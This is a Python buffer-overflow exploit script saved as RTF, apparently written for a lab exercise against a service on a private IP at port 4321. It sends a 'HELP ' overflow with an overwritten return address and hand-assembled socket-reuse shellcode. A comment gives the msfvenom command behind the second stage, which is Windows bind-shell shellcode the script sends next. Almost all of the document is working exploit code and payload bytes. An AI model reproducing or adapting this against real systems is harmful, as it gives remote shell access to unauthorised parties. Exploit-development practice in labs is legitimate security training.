{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red186\green33\blue33;\red25\green23\blue124;\red255\green0\blue0;\red64\green128\blue128;\red0\green0\blue255;\red0\green128\blue0;\red170\green34\blue255;\red102\green102\blue102;\red136\green136\blue136;\red136\green0\blue0;\red176\green0\blue64;\red160\green0\blue0;\red128\green0\blue128;\red0\green68\blue221;\red153\green153\blue153;\red0\green160\blue0;\red160\green160\blue0;\red187\green187\blue187;\red0\green0\blue128;\red125\green144\blue41;\red187\green102\blue136;\red187\green102\blue34;\red188\green122\blue0;\red210\green65\blue58;}\f0{\cf4\i #!/usr/bin/env python3}\par
\par
{\cf6\b from} {\cf5\b socket} {\cf6\b import} socket, AF_INET, SOCK_STREAM, timeout, error\par
{\cf6\b from} {\cf5\b struct} {\cf6\b import} pack\par
{\cf6\b from} {\cf5\b sys} {\cf6\b import} {\cf6 exit}\par
{\cf6\b from} {\cf5\b time} {\cf6\b import} sleep\par
\par
{\cf4\i # CONSTANTS}\par
rhost {\cf8 =} {\cf1 "}{\cf1 192.168.29.200}{\cf1 "}\par
rport {\cf8 =} {\cf8 4321}\par
target {\cf8 =} (rhost, rport)\par
timeout_val {\cf8 =} {\cf8 10}  {\cf4\i # seconds}\par
\par
exploit {\cf8 =} b{\cf1 "}{\cf1 HELP }{\cf1 "}\par
{\cf4\i #exploit += b"\\x90" * 7}\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf22\b \\x90}{\cf1 "} {\cf8 *} {\cf8 3}\par
{\cf4\i #exploit += b"\\x40\\x23\\xA0\\x90"}\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf22\b \\x09}{\cf22\b \\xC6}{\cf22\b \\xFB}{\cf22\b \\x22}{\cf1 "}\par
\par
exploit {\cf8 +}{\cf8 =} b{\cf1 '}{\cf22\b \\x5D}{\cf22\b \\x38}{\cf22\b \\x82}{\cf22\b \\x7C}{\cf1 '}\par
\par
payload {\cf8 =} (\par
  b{\cf1 "}{\cf22\b \\x83}{\cf22\b \\xEC}{\cf22\b \\x64}{\cf1 "} {\cf4\i #SUB ESP,64}\par
  b{\cf1 "}{\cf22\b \\x54}{\cf1 "} {\cf4\i #push esp}\par
\par
  b{\cf1 "}{\cf22\b \\x59}{\cf1 "} {\cf4\i #POP ecx}\par
  b{\cf1 "}{\cf22\b \\x66}{\cf22\b \\x81}{\cf22\b \\xC1}{\cf22\b \\x74}{\cf22\b \\x02}{\cf1 "} {\cf4\i #add cx,271}\par
{\cf4\i #this is to add value of socket descriptor to stack}\par
  b{\cf1 "}{\cf22\b \\x33}{\cf22\b \\xDB}{\cf1 "} {\cf4\i #XOR EBX,EBX}\par
{\cf4\i #0022FBB4   33DB             }\par
{\cf4\i #sets flags to 0}\par
  b{\cf1 "}{\cf22\b \\x53}{\cf1 "} {\cf4\i # PUSH EBX}\par
{\cf4\i #0022FBB6   53     }\par
{\cf4\i #puts it back on the stack        }\par
  b{\cf1 "}{\cf22\b \\x80}{\cf22\b \\xC7}{\cf22\b \\x04}{\cf1 "} {\cf4\i #ADD BH,4}\par
  b{\cf1 "}{\cf22\b \\x53}{\cf1 "} {\cf4\i # PUSH EBX}\par
  b{\cf1 "}{\cf22\b \\xC1}{\cf22\b \\xED}{\cf22\b \\x08}{\cf1 "}{\cf4\i # SHR EBP, 8}\par
  b{\cf1 "}{\cf22\b \\x55}{\cf1 "} {\cf4\i # PUSH EBP}\par
  b{\cf1 "}{\cf22\b \\x33}{\cf22\b \\xDB}{\cf1 "}\par
  b{\cf1 "}{\cf22\b \\xBB}{\cf22\b \\x90}{\cf22\b \\xA0}{\cf22\b \\x23}{\cf22\b \\x40}{\cf1 "}\par
  b{\cf1 "}{\cf22\b \\xC1}{\cf22\b \\xEB}{\cf22\b \\x08}{\cf1 "}\par
  b{\cf1 "}{\cf22\b \\xFF}{\cf22\b \\x31}{\cf1 "}{\cf4\i #PUSH DWORD PTR DS:[ECX] }\par
  b{\cf1 "}{\cf22\b \\xFF}{\cf22\b \\xD3}{\cf1 "}\par
\par
exploit {\cf8 +}{\cf8 =} payload\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf22\b \\x90}{\cf1 "} {\cf8 *} ({\cf8 42} {\cf8 -} {\cf6 len}(payload))\par
{\cf4\i #exploit += b"\\xCC" * (2 - len(payload))}\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf1 (}{\cf1 "} \par
\par
\par
{\cf6\b print}(exploit)\par
\par
{\cf4\i #msfvenom -p windows/shell_bind_tcp LPORT=443 -f python -v payload}\par
\par
secondstage {\cf8 =} ( \par
b{\cf1 "}{\cf22\b \\xfc}{\cf22\b \\xe8}{\cf22\b \\x82}{\cf22\b \\x00}{\cf22\b \\x00}{\cf22\b \\x00}{\cf22\b \\x60}{\cf22\b \\x89}{\cf22\b \\xe5}{\cf22\b \\x31}{\cf22\b \\xc0}{\cf22\b \\x64}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x8b}{\cf22\b \\x50}{\cf22\b \\x30}{\cf22\b \\x8b}{\cf22\b \\x52}{\cf22\b \\x0c}{\cf22\b \\x8b}{\cf22\b \\x52}{\cf22\b \\x14}{\cf22\b \\x8b}{\cf22\b \\x72}{\cf22\b \\x28}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x0f}{\cf22\b \\xb7}{\cf22\b \\x4a}{\cf22\b \\x26}{\cf22\b \\x31}{\cf22\b \\xff}{\cf22\b \\xac}{\cf22\b \\x3c}{\cf22\b \\x61}{\cf22\b \\x7c}{\cf22\b \\x02}{\cf22\b \\x2c}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x20}{\cf22\b \\xc1}{\cf22\b \\xcf}{\cf22\b \\x0d}{\cf22\b \\x01}{\cf22\b \\xc7}{\cf22\b \\xe2}{\cf22\b \\xf2}{\cf22\b \\x52}{\cf22\b \\x57}{\cf22\b \\x8b}{\cf22\b \\x52}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x10}{\cf22\b \\x8b}{\cf22\b \\x4a}{\cf22\b \\x3c}{\cf22\b \\x8b}{\cf22\b \\x4c}{\cf22\b \\x11}{\cf22\b \\x78}{\cf22\b \\xe3}{\cf22\b \\x48}{\cf22\b \\x01}{\cf22\b \\xd1}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x51}{\cf22\b \\x8b}{\cf22\b \\x59}{\cf22\b \\x20}{\cf22\b \\x01}{\cf22\b \\xd3}{\cf22\b \\x8b}{\cf22\b \\x49}{\cf22\b \\x18}{\cf22\b \\xe3}{\cf22\b \\x3a}{\cf22\b \\x49}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x8b}{\cf22\b \\x34}{\cf22\b \\x8b}{\cf22\b \\x01}{\cf22\b \\xd6}{\cf22\b \\x31}{\cf22\b \\xff}{\cf22\b \\xac}{\cf22\b \\xc1}{\cf22\b \\xcf}{\cf22\b \\x0d}{\cf22\b \\x01}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\xc7}{\cf22\b \\x38}{\cf22\b \\xe0}{\cf22\b \\x75}{\cf22\b \\xf6}{\cf22\b \\x03}{\cf22\b \\x7d}{\cf22\b \\xf8}{\cf22\b \\x3b}{\cf22\b \\x7d}{\cf22\b \\x24}{\cf22\b \\x75}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\xe4}{\cf22\b \\x58}{\cf22\b \\x8b}{\cf22\b \\x58}{\cf22\b \\x24}{\cf22\b \\x01}{\cf22\b \\xd3}{\cf22\b \\x66}{\cf22\b \\x8b}{\cf22\b \\x0c}{\cf22\b \\x4b}{\cf22\b \\x8b}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x58}{\cf22\b \\x1c}{\cf22\b \\x01}{\cf22\b \\xd3}{\cf22\b \\x8b}{\cf22\b \\x04}{\cf22\b \\x8b}{\cf22\b \\x01}{\cf22\b \\xd0}{\cf22\b \\x89}{\cf22\b \\x44}{\cf22\b \\x24}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x24}{\cf22\b \\x5b}{\cf22\b \\x5b}{\cf22\b \\x61}{\cf22\b \\x59}{\cf22\b \\x5a}{\cf22\b \\x51}{\cf22\b \\xff}{\cf22\b \\xe0}{\cf22\b \\x5f}{\cf22\b \\x5f}{\cf22\b \\x5a}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x8b}{\cf22\b \\x12}{\cf22\b \\xeb}{\cf22\b \\x8d}{\cf22\b \\x5d}{\cf22\b \\x68}{\cf22\b \\x33}{\cf22\b \\x32}{\cf22\b \\x00}{\cf22\b \\x00}{\cf22\b \\x68}{\cf22\b \\x77}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x73}{\cf22\b \\x32}{\cf22\b \\x5f}{\cf22\b \\x54}{\cf22\b \\x68}{\cf22\b \\x4c}{\cf22\b \\x77}{\cf22\b \\x26}{\cf22\b \\x07}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\xb8}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x90}{\cf22\b \\x01}{\cf22\b \\x00}{\cf22\b \\x00}{\cf22\b \\x29}{\cf22\b \\xc4}{\cf22\b \\x54}{\cf22\b \\x50}{\cf22\b \\x68}{\cf22\b \\x29}{\cf22\b \\x80}{\cf22\b \\x6b}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x00}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x6a}{\cf22\b \\x08}{\cf22\b \\x59}{\cf22\b \\x50}{\cf22\b \\xe2}{\cf22\b \\xfd}{\cf22\b \\x40}{\cf22\b \\x50}{\cf22\b \\x40}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x50}{\cf22\b \\x68}{\cf22\b \\xea}{\cf22\b \\x0f}{\cf22\b \\xdf}{\cf22\b \\xe0}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x97}{\cf22\b \\x68}{\cf22\b \\x02}{\cf22\b \\x00}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x01}{\cf22\b \\xbb}{\cf22\b \\x89}{\cf22\b \\xe6}{\cf22\b \\x6a}{\cf22\b \\x10}{\cf22\b \\x56}{\cf22\b \\x57}{\cf22\b \\x68}{\cf22\b \\xc2}{\cf22\b \\xdb}{\cf22\b \\x37}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x67}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x57}{\cf22\b \\x68}{\cf22\b \\xb7}{\cf22\b \\xe9}{\cf22\b \\x38}{\cf22\b \\xff}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x57}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x68}{\cf22\b \\x74}{\cf22\b \\xec}{\cf22\b \\x3b}{\cf22\b \\xe1}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x57}{\cf22\b \\x97}{\cf22\b \\x68}{\cf22\b \\x75}{\cf22\b \\x6e}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x4d}{\cf22\b \\x61}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x68}{\cf22\b \\x63}{\cf22\b \\x6d}{\cf22\b \\x64}{\cf22\b \\x00}{\cf22\b \\x89}{\cf22\b \\xe3}{\cf22\b \\x57}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x57}{\cf22\b \\x57}{\cf22\b \\x31}{\cf22\b \\xf6}{\cf22\b \\x6a}{\cf22\b \\x12}{\cf22\b \\x59}{\cf22\b \\x56}{\cf22\b \\xe2}{\cf22\b \\xfd}{\cf22\b \\x66}{\cf22\b \\xc7}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x44}{\cf22\b \\x24}{\cf22\b \\x3c}{\cf22\b \\x01}{\cf22\b \\x01}{\cf22\b \\x8d}{\cf22\b \\x44}{\cf22\b \\x24}{\cf22\b \\x10}{\cf22\b \\xc6}{\cf22\b \\x00}{\cf22\b \\x44}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x54}{\cf22\b \\x50}{\cf22\b \\x56}{\cf22\b \\x56}{\cf22\b \\x56}{\cf22\b \\x46}{\cf22\b \\x56}{\cf22\b \\x4e}{\cf22\b \\x56}{\cf22\b \\x56}{\cf22\b \\x53}{\cf22\b \\x56}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x68}{\cf22\b \\x79}{\cf22\b \\xcc}{\cf22\b \\x3f}{\cf22\b \\x86}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x89}{\cf22\b \\xe0}{\cf22\b \\x4e}{\cf22\b \\x56}{\cf22\b \\x46}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\xff}{\cf22\b \\x30}{\cf22\b \\x68}{\cf22\b \\x08}{\cf22\b \\x87}{\cf22\b \\x1d}{\cf22\b \\x60}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\xbb}{\cf22\b \\xf0}{\cf22\b \\xb5}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\xa2}{\cf22\b \\x56}{\cf22\b \\x68}{\cf22\b \\xa6}{\cf22\b \\x95}{\cf22\b \\xbd}{\cf22\b \\x9d}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf22\b \\x3c}{\cf22\b \\x06}{\cf22\b \\x7c}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x0a}{\cf22\b \\x80}{\cf22\b \\xfb}{\cf22\b \\xe0}{\cf22\b \\x75}{\cf22\b \\x05}{\cf22\b \\xbb}{\cf22\b \\x47}{\cf22\b \\x13}{\cf22\b \\x72}{\cf22\b \\x6f}{\cf22\b \\x6a}{\cf1 "}\par
b{\cf1 "}{\cf22\b \\x00}{\cf22\b \\x53}{\cf22\b \\xff}{\cf22\b \\xd5}{\cf1 "}\par
)\par
\par
{\cf6\b if} __name__ {\cf8 ==} {\cf1 '}{\cf1 __main__}{\cf1 '}:\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] creating the socket}{\cf1 '})\par
    s {\cf8 =} socket(AF_INET, SOCK_STREAM)\par
    s{\cf8 .}settimeout(timeout_val)\par
    {\cf6\b try}:\par
        {\cf6\b print}({\cf1 '}{\cf1 [*] connecting to the target}{\cf1 '})\par
        s{\cf8 .}connect(target)\par
        s{\cf8 .}recv({\cf8 1024})\par
        {\cf6\b print}({\cf1 '}{\cf1 [*] sending exploit}{\cf1 '})\par
        s{\cf8 .}send(exploit)\par
        {\cf6\b print}({\cf1 '}{\cf1 [*] sending out payload value}{\cf1 '})\par
 {\cf4\i #       sleep(1)}\par
        {\cf4\i #sleep(500)}\par
        sleep({\cf8 10})\par
       {\cf4\i # s.send(b"\\xCC" * 512)}\par
        s{\cf8 .}send(secondstage)\par
      {\cf4\i #  s.send(secondstage)}\par
\par
        {\cf6\b print}({\cf1 '}{\cf1 [*] cleaning up}{\cf1 '})\par
       {\cf4\i # s.close()}\par
    {\cf6\b except} timeout:\par
        {\cf6\b print}({\cf1 '}{\cf1 [!] socket timeout occurred, have you tried:}{\cf1 '})\par
        {\cf6\b print}({\cf1 '}{\cf22\b \\t}{\cf1 * ensure the debugger is not in a paused state}{\cf1 '})\par
        {\cf6\b print}({\cf1 '}{\cf22\b \\t}{\cf1 * checking if the VM is connected to the right virt network?}{\cf1 '})\par
        {\cf6 exit}({\cf8 1})\par
        s{\cf8 .}close()\par
    {\cf6\b except} error:\par
        {\cf6\b print}({\cf1 '}{\cf1 [!] a socket error occurred, is the host up?}{\cf1 '})\par
        {\cf6 exit}({\cf8 1})\par
    {\cf6\b except} {\cf24\b KeyboardInterrupt}:\par
        {\cf6\b print}()  {\cf4\i # drop us below the ^C}\par
        {\cf6\b print}({\cf1 '}{\cf1 [!] user initiated cancel, exiting...}{\cf1 '})\par
        {\cf6 exit}({\cf8 1})\par
}